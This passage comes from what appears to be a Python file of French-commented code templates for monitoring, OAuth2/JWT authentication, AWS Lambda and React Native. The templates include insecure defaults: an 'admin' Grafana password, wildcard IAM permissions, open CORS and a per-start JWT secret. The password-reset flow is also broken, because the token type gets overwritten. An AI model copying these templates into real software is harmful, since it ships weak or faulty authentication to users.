                        "expr": "histogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m]))",
                        "legendFormat": "{{endpoint}}"
                    }
                ],
                "type": "graph"
            },
            {
                "title": "Error Rate",
                "targets": [
                    {
                        "expr": "rate(http_requests_total{status=~\\"5..\\"}[5m])",
                        "legendFormat": "5xx errors"
                    }
                ],
                "type": "graph"
            },
            {
                "title": "Active Users",
                "targets": [
                    {
                        "expr": "active_users",
                        "legendFormat": "{{user_type}}"
                    }
                ],
                "type": "stat"
            },
            {
                "title": "Database Connections",
                "targets": [
                    {
                        "expr": "database_connections_total",
                        "legendFormat": "{{state}}"
                    }
                ],
                "type": "gauge"
            },
            {
                "title": "Cache Hit Rate",
                "targets": [
                    {
                        "expr": "rate(cache_hits_total[5m]) / (rate(cache_hits_total[5m]) + rate(cache_misses_total[5m]))",
                        "legendFormat": "{{cache_name}}"
                    }
                ],
                "type": "graph"
            },
            {
                "title": "System CPU Usage",
                "targets": [
                    {
                        "expr": "system_cpu_usage_percent",
                        "legendFormat": "CPU"
                    }
                ],
                "type": "graph"
            },
            {
                "title": "System Memory Usage",
                "targets": [
                    {
                        "expr": "system_memory_usage_percent",
                        "legendFormat": "Memory"
                    }
                ],
                "type": "graph"
            }
        ]
    }
}

# ========================================
# DOCKER COMPOSE POUR STACK MONITORING
# ========================================

docker_compose = \"\"\"
version: '3.8'

services:
  app:
    build: .
    ports:
      - "5000:5000"
    networks:
      - monitoring
    
  prometheus:
    image: prom/prometheus:latest
    ports:
      - "9090:9090"
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
      - ./alerts.yml:/etc/prometheus/alerts.yml
      - prometheus_data:/prometheus
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'
      - '--storage.tsdb.path=/prometheus'
      - '--web.enable-lifecycle'
    networks:
      - monitoring
    
  grafana:
    image: grafana/grafana:latest
    ports:
      - "3000:3000"
    volumes:
      - grafana_data:/var/lib/grafana
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
      - GF_USERS_ALLOW_SIGN_UP=false
    networks:
      - monitoring
    
  node-exporter:
    image: prom/node-exporter:latest
    ports:
      - "9100:9100"
    networks:
      - monitoring
    
  alertmanager:
    image: prom/alertmanager:latest
    ports:
      - "9093:9093"
    volumes:
      - ./alertmanager.yml:/etc/alertmanager/alertmanager.yml
    networks:
      - monitoring

networks:
  monitoring:
    driver: bridge

volumes:
  prometheus_data:
  grafana_data:
\"\"\"

if __name__ == "__main__":
    # Démarrer la collecte de métriques système en arrière-plan
    import threading
    
    def collect_system_metrics():
        while True:
            system_collector.collect_metrics()
            time.sleep(15)
    
    metrics_thread = threading.Thread(target=collect_system_metrics, daemon=True)
    metrics_thread.start()
    
    # Démarrer l'application
    app.run(host='0.0.0.0', port=5000)
"""
    },

    # ========================================
    # SECURITY - OAUTH2 & JWT
    # ========================================
    
    "oauth2_security": {
        "patterns": ["oauth2", "jwt", "authentication", "security", "authorization", "token"],
        "template": """
# ========================================
# OAUTH2 & JWT - SYSTÈME D'AUTHENTIFICATION COMPLET
# ========================================

from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from jose import JWTError, jwt
from passlib.context import CryptContext
from datetime import datetime, timedelta
from typing import Optional, List
from pydantic import BaseModel, EmailStr, validator
from sqlalchemy.orm import Session
import secrets
import hashlib

# ========================================
# CONFIGURATION
# ========================================

SECRET_KEY = secrets.token_urlsafe(32)
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30
REFRESH_TOKEN_EXPIRE_DAYS = 7

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

app = FastAPI()

# ========================================
# MODELS PYDANTIC
# ========================================

class Token(BaseModel):
    access_token: str
    refresh_token: str
    token_type: str = "bearer"
    expires_in: int

class TokenData(BaseModel):
    username: Optional[str] = None
    scopes: List[str] = []

class UserCreate(BaseModel):
    username: str
    email: EmailStr
    password: str
    full_name: Optional[str] = None
    
    @validator('password')
    def password_strength(cls, v):
        if len(v) < 8:
            raise ValueError('Password must be at least 8 characters')
        if not any(char.isdigit() for char in v):
            raise ValueError('Password must contain at least one digit')
        if not any(char.isupper() for char in v):
            raise ValueError('Password must contain at least one uppercase letter')
        return v

class User(BaseModel):
    id: int
    username: str
    email: EmailStr
    full_name: Optional[str] = None
    disabled: bool = False
    email_verified: bool = False
    roles: List[str] = []
    
    class Config:
        orm_mode = True

class UserInDB(User):
    hashed_password: str

# ========================================
# UTILITAIRES DE SÉCURITÉ
# ========================================

def verify_password(plain_password: str, hashed_password: str) -> bool:
    '''Vérifier un mot de passe'''
    return pwd_context.verify(plain_password, hashed_password)

def get_password_hash(password: str) -> str:
    '''Hasher un mot de passe'''
    return pwd_context.hash(password)

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
    '''Créer un token JWT d'accès'''
    to_encode = data.copy()
    
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    
    to_encode.update({
        "exp": expire,
        "iat": datetime.utcnow(),
        "type": "access"
    })
    
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt

def create_refresh_token(data: dict):
    '''Créer un token de rafraîchissement'''
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)
    
    to_encode.update({
        "exp": expire,
        "iat": datetime.utcnow(),
        "type": "refresh"
    })
    
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt

def decode_token(token: str) -> dict:
    '''Décoder et valider un token JWT'''
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except JWTError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Could not validate credentials",
            headers={"WWW-Authenticate": "Bearer"},
        )

# ========================================
# DÉPENDANCES D'AUTHENTIFICATION
# ========================================

async def get_current_user(token: str = Depends(oauth2_scheme)) -> User:
    '''Récupérer l'utilisateur actuel à partir du token'''
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    
    try:
        payload = decode_token(token)
        username: str = payload.get("sub")
        token_type: str = payload.get("type")
        
        if username is None or token_type != "access":
            raise credentials_exception
            
        token_scopes = payload.get("scopes", [])
        token_data = TokenData(username=username, scopes=token_scopes)
        
    except JWTError:
        raise credentials_exception
    
    # Récupérer l'utilisateur de la base de données
    user = get_user(username=token_data.username)
    if user is None:
        raise credentials_exception
    
    return user

async def get_current_active_user(
    current_user: User = Depends(get_current_user)
) -> User:
    '''S'assurer que l'utilisateur est actif'''
    if current_user.disabled:
        raise HTTPException(status_code=400, detail="Inactive user")
    return current_user

# ========================================
# AUTHORIZATION - ROLE-BASED ACCESS CONTROL
# ========================================

class RoleChecker:
    '''Vérificateur de rôles pour RBAC'''
    
    def __init__(self, required_roles: List[str]):
        self.required_roles = required_roles
    
    def __call__(self, user: User = Depends(get_current_active_user)):
        if not any(role in user.roles for role in self.required_roles):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Operation not permitted"
            )
        return user

# Usage: require_admin = RoleChecker(["admin"])
# @app.get("/admin/users", dependencies=[Depends(require_admin)])

class ScopeChecker:
    '''Vérificateur de scopes OAuth2'''
    
    def __init__(self, required_scopes: List[str]):
        self.required_scopes = required_scopes
    
    def __call__(self, token: str = Depends(oauth2_scheme)):
        payload = decode_token(token)
        token_scopes = payload.get("scopes", [])
        
        if not all(scope in token_scopes for scope in self.required_scopes):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Not enough permissions"
            )
        
        return payload

# ========================================
# ENDPOINTS D'AUTHENTIFICATION
# ========================================

@app.post("/register", response_model=User)
async def register(user_create: UserCreate):
    '''Inscription d'un nouvel utilisateur'''
    # Vérifier si l'utilisateur existe déjà
    existing_user = get_user(username=user_create.username)
    if existing_user:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Username already registered"
        )
    
    # Vérifier si l'email existe déjà
    existing_email = get_user_by_email(email=user_create.email)
    if existing_email:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Email already registered"
        )
    
    # Créer l'utilisateur
    hashed_password = get_password_hash(user_create.password)
    user = create_user(
        username=user_create.username,
        email=user_create.email,
        hashed_password=hashed_password,
        full_name=user_create.full_name
    )
    
    # Envoyer un email de vérification
    send_verification_email(user.email)
    
    return user

@app.post("/token", response_model=Token)
async def login(form_data: OAuth2PasswordRequestForm = Depends()):
    '''Connexion et génération de tokens'''
    # Authentifier l'utilisateur
    user = authenticate_user(form_data.username, form_data.password)
    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    # Créer les tokens
    access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": user.username, "scopes": form_data.scopes, "roles": user.roles},
        expires_delta=access_token_expires
    )
    
    refresh_token = create_refresh_token(
        data={"sub": user.username}
    )
    
    # Sauvegarder le refresh token en base
    save_refresh_token(user.id, refresh_token)
    
    return Token(
        access_token=access_token,
        refresh_token=refresh_token,
        expires_in=ACCESS_TOKEN_EXPIRE_MINUTES * 60
    )

@app.post("/token/refresh", response_model=Token)
async def refresh_token(refresh_token: str):
    '''Rafraîchir un access token'''
    try:
        payload = decode_token(refresh_token)
        
        if payload.get("type") != "refresh":
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid token type"
            )
        
        username = payload.get("sub")
        
        # Vérifier que le refresh token est valide en base
        if not verify_refresh_token(username, refresh_token):
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid refresh token"
            )
        
        # Créer un nouveau access token
        user = get_user(username=username)
        access_token = create_access_token(
            data={"sub": user.username, "roles": user.roles}
        )
        
        return Token(
            access_token=access_token,
            refresh_token=refresh_token,
            expires_in=ACCESS_TOKEN_EXPIRE_MINUTES * 60
        )
        
    except JWTError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Could not validate credentials"
        )

@app.post("/logout")
async def logout(
    current_user: User = Depends(get_current_active_user),
    token: str = Depends(oauth2_scheme)
):
    '''Déconnexion - invalider les tokens'''
    # Ajouter le token à une blacklist
    blacklist_token(token)
    
    # Révoquer tous les refresh tokens de l'utilisateur
    revoke_refresh_tokens(current_user.id)
    
    return {"message": "Successfully logged out"}

@app.get("/users/me", response_model=User)
async def read_users_me(current_user: User = Depends(get_current_active_user)):
    '''Récupérer les informations de l'utilisateur actuel'''
    return current_user

@app.post("/verify-email")
async def verify_email(token: str):
    '''Vérifier l'email d'un utilisateur'''
    try:
        payload = decode_token(token)
        email = payload.get("email")
        
        user = get_user_by_email(email)
        if not user:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="User not found"
            )
        
        # Marquer l'email comme vérifié
        verify_user_email(user.id)
        
        return {"message": "Email verified successfully"}
        
    except JWTError:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invalid verification token"
        )

@app.post("/password-reset/request")
async def request_password_reset(email: EmailStr):
    '''Demander un reset de mot de passe'''
    user = get_user_by_email(email)
    if not user:
        # Ne pas révéler si l'utilisateur existe
        return {"message": "If the email exists, a reset link has been sent"}
    
    # Créer un token de reset
    reset_token = create_access_token(
        data={"sub": user.username, "type": "password_reset"},
        expires_delta=timedelta(hours=1)
    )
    
    # Envoyer l'email
    send_password_reset_email(user.email, reset_token)
    
    return {"message": "If the email exists, a reset link has been sent"}

@app.post("/password-reset/confirm")
async def reset_password(token: str, new_password: str):
    '''Confirmer le reset de mot de passe'''
    try:
        payload = decode_token(token)
        
        if payload.get("type") != "password_reset":
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Invalid token type"
            )
        
        username = payload.get("sub")
        user = get_user(username=username)
        
        # Valider le nouveau mot de passe
        UserCreate(username=username, email=user.email, password=new_password)
        
        # Mettre à jour le mot de passe
        hashed_password = get_password_hash(new_password)
        update_user_password(user.id, hashed_password)
        
        # Révoquer tous les tokens existants
        revoke_refresh_tokens(user.id)
        
        return {"message": "Password reset successfully"}
        
    except JWTError:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invalid or expired token"
        )

# ========================================
# MIDDLEWARE DE SÉCURITÉ
# ========================================

from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    '''Middleware pour ajouter des headers de sécurité'''
    
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
        response.headers["Content-Security-Policy"] = "default-src 'self'"
        
        return response

app.add_middleware(SecurityHeadersMiddleware)

# Rate limiting
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/login")
@limiter.limit("5/minute")
async def login_limited(request: Request, form_data: OAuth2PasswordRequestForm = Depends()):
    return await login(form_data)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
"""
    },

    # ========================================
    # SERVERLESS - AWS LAMBDA
    # ========================================
    
    "aws_lambda_complete": {
        "patterns": ["aws lambda", "serverless", "lambda function", "api gateway", "serverless framework"],
        "template": """
# ========================================
# AWS LAMBDA - FONCTIONS SERVERLESS COMPLÈTES
# ========================================

import json
import boto3
import os
from typing import Dict, Any, Optional
from datetime import datetime
import logging
from dataclasses import dataclass, asdict
import base64

# Configuration du logging
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# ========================================
# LAMBDA HANDLER DE BASE
# ========================================

def lambda_handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
    '''Handler Lambda de base avec logging et gestion d'erreurs'''
    
    # Log de la requête
    logger.info(f"Received event: {json.dumps(event)}")
    logger.info(f"Request ID: {context.request_id}")
    logger.info(f"Function Name: {context.function_name}")
    logger.info(f"Remaining time: {context.get_remaining_time_in_millis()}ms")
    
    try:
        # Logique métier
        result = process_event(event)
        
        # Réponse de succès
        return {
            'statusCode': 200,
            'headers': {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Headers': 'Content-Type,X-Amz-Date,Authorization,X-Api-Key',
                'Access-Control-Allow-Methods': 'GET,POST,PUT,DELETE,OPTIONS'
            },
            'body': json.dumps({
                'success': True,
                'data': result,
                'timestamp': datetime.utcnow().isoformat()
            })
        }
        
    except Exception as e:
        logger.error(f"Error processing event: {str(e)}", exc_info=True)
        
        return {
            'statusCode': 500,
            'headers': {'Content-Type': 'application/json'},
            'body': json.dumps({
                'success': False,
                'error': str(e),
                'request_id': context.request_id
            })
        }

# ========================================
# LAMBDA AVEC API GATEWAY
# ========================================

def api_gateway_handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
    '''Handler pour requêtes API Gateway'''
    
    # Parser la requête
    http_method = event.get('httpMethod')
    path = event.get('path')
    query_params = event.get('queryStringParameters', {})
    headers = event.get('headers', {})
    body = event.get('body')
    
    # Parser le body si présent
    if body:
        try:
            body = json.loads(body)
        except json.JSONDecodeError:
            return error_response(400, "Invalid JSON body")
    
    # Router par méthode HTTP
    if http_method == 'GET':
        return handle_get(path, query_params)
    elif http_method == 'POST':
        return handle_post(path, body)
    elif http_method == 'PUT':
        return handle_put(path, body)
    elif http_method == 'DELETE':
        return handle_delete(path, query_params)
    else:
        return error_response(405, "Method not allowed")

def success_response(data: Any, status_code: int = 200) -> Dict[str, Any]:
    '''Créer une réponse de succès'''
    return {
        'statusCode': status_code,
        'headers': {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        },
        'body': json.dumps(data)
    }

def error_response(status_code: int, message: str) -> Dict[str, Any]:
    '''Créer une réponse d'erreur'''
    return {
        'statusCode': status_code,
        'headers': {'Content-Type': 'application/json'},
        'body': json.dumps({'error': message})
    }

# ========================================
# LAMBDA AVEC S3 TRIGGER
# ========================================

def s3_trigger_handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
    '''Handler pour événements S3'''
    
    s3_client = boto3.client('s3')
    
    for record in event['Records']:
        # Informations sur l'objet S3
        bucket = record['s3']['bucket']['name']
        key = record['s3']['object']['key']
        event_name = record['eventName']
        
        logger.info(f"Processing {event_name} for {bucket}/{key}")
        
        try:
            if 'ObjectCreated' in event_name:
                # Traiter un nouveau fichier
                obj = s3_client.get_object(Bucket=bucket, Key=key)
                content = obj['Body'].read()
                
                # Exemple: redimensionner une image
                if key.endswith(('.jpg', '.jpeg', '.png')):
                    process_image(content, bucket, key)
                
                # Exemple: traiter un fichier CSV
                elif key.endswith('.csv'):
                    process_csv(content, bucket, key)
                
            elif 'ObjectRemoved' in event_name:
                logger.info(f"Object removed: {key}")
                
        except Exception as e:
            logger.error(f"Error processing {key}: {str(e)}")
            raise
    
    return {'statusCode': 200, 'body': 'Processed successfully'}

def process_image(image_data: bytes, bucket: str, key: str):
    '''Traiter une image (exemple avec PIL)'''
    from PIL import Image
    from io import BytesIO
    
    # Charger l'image
    img = Image.open(BytesIO(image_data))
    
    # Redimensionner
    img.thumbnail((800, 800))
    
    # Sauvegarder dans un nouveau bucket/prefix
    output_buffer = BytesIO()
    img.save(output_buffer, format='JPEG')
    output_buffer.seek(0)
    
    s3_client = boto3.client('s3')
    s3_client.put_object(
        Bucket=bucket,
        Key=f"thumbnails/{key}",
        Body=output_buffer,
        ContentType='image/jpeg'
    )
    
    logger.info(f"Thumbnail created: thumbnails/{key}")

# ========================================
# LAMBDA AVEC DYNAMODB STREAM
# ========================================

def dynamodb_stream_handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
    '''Handler pour DynamoDB Streams'''
    
    for record in event['Records']:
        event_name = record['eventName']  # INSERT, MODIFY, REMOVE
        
        if event_name == 'INSERT':
            new_image = record['dynamodb']['NewImage']
            logger.info(f"New item: {new_image}")
            handle_insert(new_image)
            
        elif event_name == 'MODIFY':
            old_image = record['dynamodb']['OldImage']
            new_image = record['dynamodb']['NewImage']
            logger.info(f"Modified item: {old_image} -> {new_image}")
            handle_modify(old_image, new_image)
            
        elif event_name == 'REMOVE':
            old_image = record['dynamodb']['OldImage']
            logger.info(f"Removed item: {old_image}")
            handle_remove(old_image)
    
    return {'statusCode': 200}

def handle_insert(new_image: Dict):
    '''Gérer une insertion DynamoDB'''
    # Exemple: envoyer une notification
    sns = boto3.client('sns')
    sns.publish(
        TopicArn=os.environ['SNS_TOPIC_ARN'],
        Message=json.dumps({'event': 'new_item', 'data': new_image})
    )

# ========================================
# LAMBDA AVEC SQS TRIGGER
# ========================================

def sqs_trigger_handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
    '''Handler pour messages SQS'''
    
    failed_messages = []
    
    for record in event['Records']:
        message_id = record['messageId']
        body = record['body']
        
        try:
            # Parser le message
            message = json.loads(body)
            logger.info(f"Processing message {message_id}: {message}")
            
            # Traiter le message
            result = process_message(message)
            
            if not result:
                failed_messages.append(message_id)
                
        except Exception as e:
            logger.error(f"Error processing message {message_id}: {str(e)}")
            failed_messages.append(message_id)
    
    # Retourner les messages échoués pour retry
    if failed_messages:
        return {
            'batchItemFailures': [
                {'itemIdentifier': msg_id} for msg_id in failed_messages
            ]
        }
    
    return {'statusCode': 200}

# ========================================
# LAMBDA AVEC SECRETS MANAGER
# ========================================

def get_secret(secret_name: str) -> Dict[str, Any]:
    '''Récupérer un secret depuis Secrets Manager'''
    
    session = boto3.session.Session()
    client = session.client('secretsmanager')
    
    try:
        response = client.get_secret_value(SecretId=secret_name)
        
        if 'SecretString' in response:
            return json.loads(response['SecretString'])
        else:
            return json.loads(base64.b64decode(response['SecretBinary']))
            
    except Exception as e:
        logger.error(f"Error retrieving secret {secret_name}: {str(e)}")
        raise

def lambda_with_secrets(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
    '''Lambda utilisant des secrets'''
    
    # Récupérer les credentials de la base de données
    db_credentials = get_secret('prod/database/credentials')
    
    # Se connecter à la base de données
    import pymysql
    connection = pymysql.connect(
        host=db_credentials['host'],
        user=db_credentials['username'],
        password=db_credentials['password'],
        database=db_credentials['database']
    )
    
    # Exécuter une requête
    with connection.cursor() as cursor:
        cursor.execute("SELECT * FROM users")
        results = cursor.fetchall()
    
    connection.close()
    
    return success_response(results)

# ========================================
# LAMBDA LAYERS
# ========================================

# layer/python/lib/python3.11/site-packages/common_utils.py
class LambdaUtils:
    '''Utilitaires communs pour Lambdas'''
    
    @staticmethod
    def parse_event(event: Dict) -> Dict:
        '''Parser un événement Lambda'''
        if 'body' in event and isinstance(event['body'], str):
            try:
                event['body'] = json.loads(event['body'])
            except json.JSONDecodeError:
                pass
        return event
    
    @staticmethod
    def validate_required_fields(data: Dict, required_fields: list) -> tuple[bool, Optional[str]]:
        '''Valider les champs requis'''
        for field in required_fields:
            if field not in data or data[field] is None:
                return False, f"Missing required field: {field}"
        return True, None

# ========================================
# SERVERLESS FRAMEWORK CONFIG
# ========================================

serverless_yml = \"\"\"
service: my-lambda-service

provider:
  name: aws
  runtime: python3.11
  region: us-east-1
  stage: ${opt:stage, 'dev'}
  memorySize: 512
  timeout: 30
  
  environment:
    STAGE: ${self:provider.stage}
    REGION: ${self:provider.region}
    TABLE_NAME: ${self:custom.tableName}
  
  iamRoleStatements:
    - Effect: Allow
      Action:
        - dynamodb:*
        - s3:*
        - sqs:*
        - sns:*
        - secretsmanager:GetSecretValue
      Resource: "*"
  
  logs:
    restApi: true
  
  tracing:
    apiGateway: true
    lambda: true

functions:
  api:
    handler: handler.api_gateway_handler
    events:
      - http:
          path: /users
          method: GET
          cors: true
      - http:
          path: /users
          method: POST
          cors: true
          authorizer:
            name: authorizer
            resultTtlInSeconds: 300
    layers:
      - {Ref: CommonLibsLambdaLayer}
  
  s3Processor:
    handler: handler.s3_trigger_handler
    events:
      - s3:
          bucket: my-upload-bucket
          event: s3:ObjectCreated:*
          rules:
            - prefix: uploads/
            - suffix: .jpg
  
  streamProcessor:
    handler: handler.dynamodb_stream_handler
    events:
      - stream:
          type: dynamodb
          arn:
            Fn::GetAtt: [UsersTable, StreamArn]
          batchSize: 10
          startingPosition: LATEST
  
  sqsWorker:
    handler: handler.sqs_trigger_handler
    events:
      - sqs:
          arn:
            Fn::GetAtt: [TaskQueue, Arn]
          batchSize: 10
    reservedConcurrency: 5
  
  scheduled:
    handler: handler.scheduled_handler
    events:
      - schedule:
          rate: cron(0 2 * * ? *)
          enabled: true

layers:
  commonLibs:
    path: layer
    compatibleRuntimes:
      - python3.11

resources:
  Resources:
    UsersTable:
      Type: AWS::DynamoDB::Table
      Properties:
        TableName: ${self:custom.tableName}
        AttributeDefinitions:
          - AttributeName: id
            AttributeType: S
        KeySchema:
          - AttributeName: id
            KeyType: HASH
        BillingMode: PAY_PER_REQUEST
        StreamSpecification:
          StreamViewType: NEW_AND_OLD_IMAGES
    
    TaskQueue:
      Type: AWS::SQS::Queue
      Properties:
        QueueName: task-queue-${self:provider.stage}
        VisibilityTimeout: 300
        RedrivePolicy:
          deadLetterTargetArn:
            Fn::GetAtt: [TaskDLQ, Arn]
          maxReceiveCount: 3
    
    TaskDLQ:
      Type: AWS::SQS::Queue
      Properties:
        QueueName: task-dlq-${self:provider.stage}

custom:
  tableName: users-${self:provider.stage}

plugins:
  - serverless-python-requirements
  - serverless-plugin-tracing

package:
  exclude:
    - node_modules/**
    - venv/**
    - .git/**
\"\"\"

# ========================================
# SAM TEMPLATE (Alternative à Serverless Framework)
# ========================================

sam_template = \"\"\"
AWSTemplateFormatVersion: '2010-09-09'
Transform: AWS::Serverless-2016-10-31

Globals:
  Function:
    Timeout: 30
    MemorySize: 512
    Runtime: python3.11
    Tracing: Active
    Environment:
      Variables:
        STAGE: !Ref Stage

Parameters:
  Stage:
    Type: String
    Default: dev

Resources:
  ApiFunction:
    Type: AWS::Serverless::Function
    Properties:
      CodeUri: src/
      Handler: handler.api_gateway_handler
      Policies:
        - DynamoDBCrudPolicy:
            TableName: !Ref UsersTable
      Events:
        GetUsers:
          Type: Api
          Properties:
            Path: /users
            Method: GET
        PostUser:
          Type: Api
          Properties:
            Path: /users
            Method: POST
  
  S3ProcessorFunction:
    Type: AWS::Serverless::Function
    Properties:
      CodeUri: src/
      Handler: handler.s3_trigger_handler
      Policies:
        - S3CrudPolicy:
            BucketName: !Ref UploadBucket
      Events:
        S3Event:
          Type: S3
          Properties:
            Bucket: !Ref UploadBucket
            Events: s3:ObjectCreated:*
  
  UsersTable:
    Type: AWS::DynamoDB::Table
    Properties:
      AttributeDefinitions:
        - AttributeName: id
          AttributeType: S
      KeySchema:
        - AttributeName: id
          KeyType: HASH
      BillingMode: PAY_PER_REQUEST
  
  UploadBucket:
    Type: AWS::S3::Bucket

Outputs:
  ApiUrl:
    Description: API Gateway endpoint URL
    Value: !Sub 'https://${ServerlessRestApi}.execute-api.${AWS::Region}.amazonaws.com/${Stage}/'
\"\"\"

if __name__ == "__main__":
    # Test local
    test_event = {
        'httpMethod': 'GET',
        'path': '/users',
        'queryStringParameters': {'page': '1'}
    }
    
    class Context:
        request_id = 'test-request-id'
        function_name = 'test-function'
        def get_remaining_time_in_millis(self):
            return 30000
    
    result = lambda_handler(test_event, Context())
    print(json.dumps(result, indent=2))
"""
    },

    # ========================================
    # MOBILE - REACT NATIVE
    # ========================================
    
    "react_native_complete": {
        "patterns": ["react native", "mobile app", "expo", "navigation", "native components"],
        "template": """
// ========================================
// REACT NATIVE - APPLICATION MOBILE COMPLÈTE
// ========================================

import React, { useState, useEffect, useContext, createContext } from 'react';
import {
  View,
  Text,
  StyleSheet,
  TouchableOpacity,
  FlatList,
  TextInput,
  Image,
  ScrollView,
  RefreshControl,
  Alert,
  Platform,
  Dimensions,
  SafeAreaView,
  StatusBar,
  ActivityIndicator,
  KeyboardAvoidingView
} from 'react-native';
import { NavigationContainer } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';
import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
import { createDrawerNavigator } from '@react-navigation/drawer';
import Icon from 'react-native-vector-icons/Ionicons';
import AsyncStorage from '@react-native-async-storage/async-storage';
import * as SecureStore from 'expo-secure-store';
import * as Notifications from 'expo-notifications';
import * as Location from 'expo-location';
import * as ImagePicker from 'expo-image-picker';
import { Camera } from 'expo-camera';
import NetInfo from '@react-native-community/netinfo';

const { width, height } = Dimensions.get('window');
const Stack = createNativeStackNavigator();
const Tab = createBottomTabNavigator();
const Drawer = createDrawerNavigator();

// ========================================
// CONTEXT API - ÉTAT GLOBAL
// ========================================

interface AuthContextType {
  user: User | null;
  token: string | null;
  login: (email: string, password: string) => Promise<void>;
  logout: () => Promise<void>;
  isLoading: boolean;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [user, setUser] = useState<User | null>(null);
  const [token, setToken] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    // Charger le token au démarrage
    loadToken();
  }, []);

  const loadToken = async () => {
    try {
      const storedToken = await SecureStore.getItemAsync('authToken');
      if (storedToken) {
        setToken(storedToken);
        // Récupérer les informations utilisateur
        await fetchUserInfo(storedToken);
      }
    } catch (error) {
      console.error('Error loading token:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const login = async (email: string, password: string) => {
    try {
      const response = await fetch('https://api.example.com/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });

      const data = await response.json();

      if (response.ok) {
        await SecureStore.setItemAsync('authToken', data.token);
        setToken(data.token);
        setUser(data.user);
      } else {
        throw new Error(data.message || 'Login failed');
      }
    } catch (error) {
      throw error;
    }
  };

  const logout = async () => {
    await SecureStore.deleteItemAsync('authToken');
    setToken(null);
    setUser(null);
  };

  const fetchUserInfo = async (token: string) => {
    try {
      const response = await fetch('https://api.example.com/users/me', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      const data = await response.json();
      setUser(data);
    } catch (error) {
      console.error('Error fetching user info:', error);
    }
  };

  return (
    <AuthContext.Provider value={{ user, token, login, logout, isLoading }}>
      {children}
    </AuthContext.Provider>
  );
};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  return context;
};

// ========================================
// HOOKS PERSONNALISÉS
// ========================================

// Hook pour requêtes API
function useApi<T>(url: string) {
  const [data, setData] = useState<T | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const { token } = useAuth();

  const refetch = async () => {
    setLoading(true);
    try {
      const response = await fetch(url, {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });
      const json = await response.json();
      setData(json);
      setError(null);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

